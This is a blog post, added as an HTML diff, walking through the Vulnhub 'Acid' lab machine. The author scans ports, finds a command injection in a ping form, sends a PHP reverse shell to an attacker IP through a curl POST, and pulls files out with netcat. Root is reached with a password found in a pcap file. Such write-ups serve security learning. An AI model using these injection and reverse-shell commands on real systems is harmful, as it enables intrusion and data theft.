@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>Vulnhub - Acid | maggick's logs</title>
+
+    <meta name="author" content="Matthieu Keller">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="http://matthieukeller.com/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="http://yui.yahooapis.com/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="http://matthieukeller.com/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="http://matthieukeller.com/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+                <li>
+                  <a href="http://matthieukeller.com/category/misc.html">Misc</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/programming.html">programming</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/programming-security.html">programming, security</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/security.html">security</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/sports.html">Sports</a>
+                </li>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="http://matthieukeller.com/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="http://matthieukeller.com/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="http://matthieukeller.com/2015/09/vulnhub-acid.html" title="Read more" class="entry-title-link">
+                Vulnhub - Acid</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2015-09-11T11:30:00+02:00">11 Sep 2015</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="http://matthieukeller.com/author/matthieu-keller.html" title="Read more posts from Matthieu Keller" class="meta-link">Matthieu Keller</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="http://matthieukeller.com/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="http://matthieukeller.com/tag/vulnhub.html" title="Read more with the label vulnhub" class="meta-link">vulnhub</a> 
+      </span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left"
+src="/media/2015.09/bg.jpg" alt="acid" width="262"></p>
+<p>Since <a href="http://matthieukeller.com/2015/06/vulnhub-fart-knocker.html">Fart knocker</a>
+in June I have worked on an other vulnhub machine:
+<a href="https://www.vulnhub.com/entry/darknet-10,120/">darknet</a>. But this one is really
+hard and get me stuck. I was a bit demotivated to continue vulnhub's machines but
+I got some time this week, therefore I tried the
+<a href="https://www.vulnhub.com/entry/acid-server,125/">Acid</a> one.</p>
+
+
+<p>The goal is as usual, get root on the virtual machine. Let's go:</p>
+<h2 id="host-discovery">Host Discovery</h2>
+<p>As always, we start with host discovery:
+<a href="http://nmap.org">Nmap</a> and <a href="https://cirt.net/Nikto2">nikto</a> are our friends for
+this step.</p>
+<h3 id="nmap">nmap</h3>
+<p>We launch nmap against the virtual machine:</p>
+<div class="highlight"><pre><span></span>$ nmap 192.168.0.18 -p0-65535 -A -oA nmap
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-09-08 12:08 CEST
+Stats: 0:07:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 98.89% done; ETC: 12:15 (0:00:05 remaining)
+Nmap scan report for 192.168.0.18
+Host is up (0.0045s latency).
+Not shown: 65535 closed ports
+PORT      STATE SERVICE
+33447/tcp open  unknown
+|_http-title: /Challenge
+
+Service detection performed. Please report any incorrect results at
+http://nmap.org/submit/ .
+</pre></div>
+
+
+<p>We got a nice Apache web server with a simple splash screen. Notice the page
+title: <strong>/Challenge</strong>.</p>
+<h3 id="nikto">Nikto</h3>
+<p>I ran nikto on the target but nothing pop out.</p>
+<h2 id="web-exploitation">Web exploitation</h2>
+<h3 id="page-source">Page source</h3>
+<p>As we come pretty empty handed, we check the page source and two interesting
+things came out:</p>
+<ul>
+<li>Some hexadecimal code at the end of the page: 0x643239334c6d70775a773d3d</li>
+<li>the title of the page (we can see it in the nmap scan) is /Challenge
+    and there is an other web page at this address.</li>
+</ul>
+<h4 id="hexa-code">Hexa code</h4>
+<p>We will start with the first lead the hexadecimal code:</p>
+<p><strong>0x643239334c6d70775a773d3d</strong></p>
+<p>We convert it to string and we got:</p>
+<p><strong>?d293LmpwZw==</strong></p>
+<p>We decode the base64 and we got:</p>
+<p><strong>wow.jpg</strong></p>
+<p>We go to the url (the /images/ is given with the background image of the first
+web page):</p>
+<p>http://192.168.0.18:33447/images/wow.jpg</p>
+<p>As a result we got a nice image that reward us for our success.</p>
+<p><img alt="wow.jpg" src="/media/2015.09/wow.jpg" /></p>
+<p>Yeah it seems to be some troll :)</p>
+<h3 id="challenge">/Challenge</h3>
+<p>Let us dig the second lead: the page title. By adding <code>/Challenge</code> in the URL,
+we land on an authentication interface.</p>
+<p>I tried to use SQL injection but nothing. We will try
+<a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a>
+with the small dictionary (`/usr/share/dirbuster/directory-list-2.3-small.txt):</p>
+<div class="highlight"><pre><span></span>DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+Report produced on Tue Sep 08 16:54:05 CEST 2015
+--------------------------------
+
+http://192.168.0.18:33447
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/Challenge/
+
+Dirs found with a 403 response:
+
+/Challenge/css/
+/Challenge/includes/
+/Challenge/js/
+/Challenge/styles/
+/Challenge/less/
+
+
+--------------------------------
+Files found during testing:
+
+Files found with a 200 responce:
+
+/Challenge/index.php
+/Challenge/error.php
+/Challenge/includes/functions.php
+/Challenge/cake.php
+
+Files found with a 302 responce:
+
+/Challenge/include.php
+/Challenge/includes/logout.php
+/Challenge/hacked.php
+
+
+--------------------------------
+</pre></div>
+
+
+<p>We got the <code>cake.php</code> page but as we all know "The cake is a lie". We noticed
+that the page title is one more time a folder: <code>/Magic_box</code>.
+When going to <code>/Challenge/Magic_box</code> we got a 403 forbidden page. Let us fire
+<a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a>
+again:</p>
+<div class="highlight"><pre><span></span>DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+Report produced on Tue Sep 08 17:17:43 CEST 2015
+--------------------------------
+
+http://192.168.0.18:33447
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 403 response:
+
+/Challenge/Magic_Box/
+/Challenge/Magic_Box/proc/
+
+
+--------------------------------
+Files found during testing:
+
+Files found with a 200 responce:
+
+/Challenge/Magic_Box/low.php
+/Challenge/Magic_Box/command.php
+
+Files found with a 302 responce:
+
+/Challenge/Magic_Box/proc/validate.php
+
+
+--------------------------------
+</pre></div>
+
+
+<p>We got some nice result mostly the <code>/command.php</code> page.</p>
+<h3 id="command-execution">Command execution</h3>
+<p>The page let us ping an other machine in the network. Nevertheless the page name
+let us think that we can use command exploitation. If we add a <code>;</code> in the filed
+and a command it seems to works, for instance with <code>; ls</code> we got (I use
+<a href="http://releases.portswigger.net/">burp</a> for all my pentest, the output of the
+command is in the response page):</p>
+<div class="highlight"><pre><span></span>command.php
+command.php.save
+command2.php.save
+command2.php.save.1
+low.php
+proc
+tails.php
+</pre></div>
+
+
+<p>We can also read <code>/etc/passwd</code>: there is two users on the server: acid and
+saman.</p>
+<p>Let us try to get a reverse shell with that.</p>
+<h3 id="reverse-shell">reverse shell</h3>
+<p>As always, a good source of information is
+<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a>.</p>
+<p>We know the site use php so we will try the php reverse shell first:</p>
+<ul>
+<li>On the host we execute: <code>nc -l -p 6666</code></li>
+<li>On the target (via the ping interface) we query:
+    <code>; php -r '$sock=fsockopen("192.168.0.13",6666);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></li>
+</ul>
+<p>It got us a shell on the machine (without tty/pty). But executing the request in the ping
+interface each time we want the shell in painful, so I extract the curl command
+from burp:</p>
+<div class="highlight"><pre><span></span>curl -i -s -k  -X &#39;POST&#39; \
+    -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0&#39; -H &#39;DNT: 1&#39; -H &#39;Referer: http://192.168.0.18:33447/Challenge/Magic_Box/command.php&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; \
+    -b &#39;sec_session_id=2cdjrm9k6khpfiilsad1kmnpj2&#39; \
+    --data-binary $&#39;IP=%3B+php+-r+%27%24sock%3Dfsockopen%28%22192.168.0.13%22%2C6666%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&amp;submit=submit&#39; \
+    &#39;http://192.168.0.18:33447/Challenge/Magic_Box/command.php&#39;
+</pre></div>
+
+
+<p>Now that we have a shell, let us see what we can do.</p>
+<h2 id="shell-exploitation">Shell exploitation</h2>
+<p>First we discover what is at our disposal, mostly in the <code>/home/</code>
+(<code>bash_history</code>). In the <code>/home/acid/</code> there is something interesting but
+empty:</p>
+<div class="highlight"><pre><span></span>ls -la /home/acid/.su*
+-rw-r--r-- 1 acid acid 0 Jul 31 17:27 /home/acid/.sudo_as_admin_successful
+</pre></div>
+
+
+<p>Let us see what else we got on the machine:</p>
+<div class="highlight"><pre><span></span><span class="nx">$</span> <span class="nx">ls</span> <span class="o">/</span>
+<span class="nx">bin</span>
+<span class="nx">boot</span>
+<span class="nx">cdrom</span>
+<span class="nx">dev</span>
+<span class="nx">etc</span>
+<span class="nx">home</span>
+<span class="nx">initrd</span><span class="p">.</span><span class="nx">img</span>
+<span class="nx">lib</span>
+<span class="nx">lost</span><span class="o">+</span><span class="nx">found</span>
+<span class="nx">media</span>
+<span class="nx">mnt</span>
+<span class="nx">opt</span>
+<span class="nx">proc</span>
+<span class="nx">root</span>
+<span class="nx">run</span>
+<span class="nx">s</span><span class="p">.</span><span class="nx">bin</span>
+<span class="nx">sbin</span>
+<span class="nx">srv</span>
+<span class="nx">sys</span>
+<span class="nx">tmp</span>
+<span class="nx">usr</span>
+<span class="kd">var</span>
+<span class="nx">vmlinuz</span>
+<span class="nx">$</span> <span class="nx">ls</span> <span class="o">/</span><span class="nx">opt</span><span class="o">/</span>
+<span class="nx">$</span> <span class="nx">ls</span> <span class="o">/</span><span class="nx">media</span>
+<span class="nx">acid</span>
+<span class="nx">floppy</span>
+<span class="nx">floppy0</span>
+<span class="nx">$</span> <span class="nx">ls</span> <span class="o">/</span><span class="nx">s</span><span class="p">.</span><span class="nx">bin</span>
+<span class="nx">investigate</span><span class="p">.</span><span class="nx">php</span>
+<span class="nx">$</span> <span class="nx">cat</span> <span class="o">/</span><span class="nx">s</span><span class="p">.</span><span class="nx">bin</span><span class="o">/</span><span class="nx">investigate</span><span class="p">.</span><span class="nx">php</span>
+<span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="s2">&quot;Now you have to behave like an investigator to catch the culprit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="o">?</span>
+</pre></div>
+
+
+<p>That is interesting the php file in <code>/s.bin/</code> clearly tell us to investigate.
+But what we need know is a privilege escalation ti gain root access.</p>
+<h3 id="privilege-escalation">Privilege escalation</h3>
+<p>I tried the overlayfs exploit (the same as with
+<a href="http://matthieukeller.com/2015/06/vulnhub-fart-knocker.html">Fart knocker</a>)
+without success:</p>
+<ul>
+<li>I compiled the exploit on an other 32 bits virtual machine;</li>
+<li>I transfered it to the shell via netcat;</li>
+<li>
+<p>And it failed:</p>
+<p>$ ./ofs.bin  : 4:
+spawning threads
+mount #1
+mount #2
+child threads done
+exploit failed</p>
+</li>
+</ul>
+<p>But we were given an hint.</p>
+<h3 id="more-investigations">More investigations</h3>
+<p>The <a href="http://pwnwiki.io/#!privesc/linux/index.md">pwnwiki.io</a> wiki is always a
+good source of information. So with more investigation we look at bash_history,
+search for <code>*txt*</code> files, an so on. Then <code>*pcap*</code> files:</p>
+<div class="highlight"><pre><span></span>$ find / -name *pcap* 2&gt;/dev/null
+/lib/modules/3.19.0-15-generic/kernel/drivers/rtc/rtc-pcap.ko
+/lib/modules/3.19.0-15-generic/kernel/drivers/input/misc/pcap_keys.ko
+/lib/modules/3.19.0-15-generic/kernel/drivers/input/touchscreen/pcap_ts.ko
+/lib/modules/3.19.0-15-generic/kernel/drivers/regulator/pcap-regulator.ko
+/sbin/raw_vs_isi/hint.pcapng
+/sbin/getpcaps
+/sys/bus/spi/drivers/ezx-pcap
+/usr/share/doc/libpcap0.8
+/usr/share/mime/application/vnd.tcpdump.pcap.xml
+/usr/share/man/man7/pcap-filter.7.gz
+/usr/share/man/man1/getpcaps.1.gz
+/usr/lib/i386-linux-gnu/libpcap.so.1.6.2
+/usr/lib/i386-linux-gnu/libpcap.so.0.8
+/usr/src/linux-headers-3.19.0-15/include/linux/mfd/ezx-pcap.h
+/usr/src/linux-headers-3.19.0-15-generic/include/config/ezx/pcap.h
+/usr/src/linux-headers-3.19.0-15-generic/include/config/touchscreen/pcap.h
+/usr/src/linux-headers-3.19.0-15-generic/include/config/rtc/drv/pcap.h
+/usr/src/linux-headers-3.19.0-15-generic/include/config/input/pcap.h
+/usr/src/linux-headers-3.19.0-15-generic/include/config/regulator/pcap.h
+/var/lib/dpkg/info/libpcap0.8:i386.postinst
+/var/lib/dpkg/info/libpcap0.8:i386.shlibs
+/var/lib/dpkg/info/libpcap0.8:i386.postrm
+/var/lib/dpkg/info/libpcap0.8:i386.md5sums
+/var/lib/dpkg/info/libpcap0.8:i386.symbols
+/var/lib/dpkg/info/libpcap0.8:i386.list
+</pre></div>
+
+
+<p>Yes <code>/sbin/raw_vs_isi/hint.pcapng</code>!</p>
+<h3 id="pcap">pcap</h3>
+<p>We transfer the file with netcat:</p>
+<ul>
+<li>On our attack machine: <code>nc -lp 1234 &gt; pcap</code></li>
+<li>On the server: <code>nc 192.168.0.13 1234 &lt; /sbin/raw_vs_isi/hint.pcapng</code></li>
+</ul>
+<p>We open the pcap file with <a href="https://www.wireshark.org/">wireshark</a>. There is a
+lot of information in this file, over 6 000 trams.
+On the 6 212 we notice some sort of text. By following the TCP stream (wireshark
+function) we discover what seems to be a chat exchange:</p>
+<blockquote>
+<p>heya</p>
+<p>hello
+What was the name of the Culprit ???</p>
+<p>saman and now a days he's known by the alias of 1337hax0r</p>
+<p>oh...Fuck....Great...Now, we gonna Catch Him Soon :D</p>
+<p>Yes .. We have to !! The mad bomber is on a rage</p>
+<p>Ohk...cya</p>
+<p>Over and Out</p>
+</blockquote>
+<p>Great, what does it means? We know that saman is one of the user on the machine.
+Maybe we got some hints about it password or something like that.</p>
+<h3 id="interactive-shell">interactive shell</h3>
+<p>In order to execute a su, we need a interactive shell (with
+<a href="https://en.wikipedia.org/wiki/Pseudoterminal">pty/tty</a>).
+Once more <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentest monkey</a>
+will help us:</p>
+<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+</pre></div>
+
+
+<p>As <code>/bin/sh</code> is a symlink to dash, we directly use bash:</p>
+<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</pre></div>
+
+
+<p>We now need to try to connect as saman.</p>
+<h2 id="saman">Saman</h2>
+<p>With our beautiful shell we jut have to <code>su saman</code> to try to connect as saman:</p>
+<div class="highlight"><pre><span></span>www-data@acid:/var/www/html/Challenge/Magic_Box$ su saman
+su saman
+Password: 1337hax0r
+</pre></div>
+
+
+<p>It works! Let us try <code>sudo su</code>:</p>
+<div class="highlight"><pre><span></span>saman@acid:/var/www/html/Challenge/Magic_Box$ sudo su
+sudo su
+[sudo] password for saman: 1337hax0r
+root@acid:/var/www/html/Challenge/Magic_Box# cat /root/flag.txt
+cat /root/flag.txt
+
+
+Dear Hax0r,
+
+
+You have successfully completed the challenge.
+
+I  hope you like it.
+
+
+FLAG NAME: &quot;Acid@Makke@Hax0r
+</pre></div>
+
+
+<h2 id="conclusion">Conclusion</h2>
+<p>It was a nice box to root but as I read the other write up it seems that my way
+was not the one expected.
+Nevertheless, thank to <a href="https://twitter.com/m_avinash143">Avinash Kumar Thapa</a>
+for the box and <a href="https://twitter.com/VulnHub">vulnhub</a>.</p>
+    </div>
+
+        <footer>
+<div class="social-buttons">
+
+
+</div>        </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2015/09/vulnhub-acid.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-books"></span>
+                    <a href="/pages/books.html">books</a>
+                </li>
+                <li>
+                    <span class= "icons icons-palmares"></span>
+                    <a href="/pages/palmares.html">palmares</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/matthieukeller">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-linkedin"></span>
+                    <a href="https://linkedin.com/in/matthieukeller">linkedin</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+    <script>
+        (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
+        function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
+        e=o.createElement(i);r=o.getElementsByTagName(i)[0];
+        e.src='//www.google-analytics.com/analytics.js';
+        r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
+        ga('create','UA-63314567-1');ga('send','pageview');
+    </script>
+
+</div>
+</body>
+</html>
